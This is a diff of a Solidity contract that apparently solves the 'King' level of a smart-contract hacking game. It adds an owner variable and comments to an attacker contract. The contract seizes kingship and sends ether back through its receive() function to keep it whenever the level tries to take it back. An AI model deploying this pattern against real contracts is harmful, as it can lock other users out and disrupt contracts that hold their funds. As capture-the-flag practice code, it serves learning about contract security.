@@ -28,11 +28,12 @@ contract King {
 
 contract KingMaker{
 
-    
-    address target= 0x05d15eCBcd730Cc0538DF635Cc76AF12CA645d64;
+    address owner;
+    address target= 0x05d15eCBcd730Cc0538DF635Cc76AF12CA645d64; //the instance given by the game
 
 
     constructor()payable{
+         owner = msg.sender;
     }
 
     
@@ -43,13 +44,13 @@ contract KingMaker{
     }
 
     function empty(address _myAddress) public{
-        payable(_myAddress).transfer(address(this).balance);
+        payable(_myAddress).transfer(address(this).balance); //send back the eth received initialy when I'm done with the contract
     }
 
     receive() external payable {
         if(msg.sender != owner){
-        target.call{value:msg.value + 1000}("");
-
+        target.call{value:msg.value + 1000}(""); //regain the king position when the level try to reclaim kingship
         }
     }
 }
+
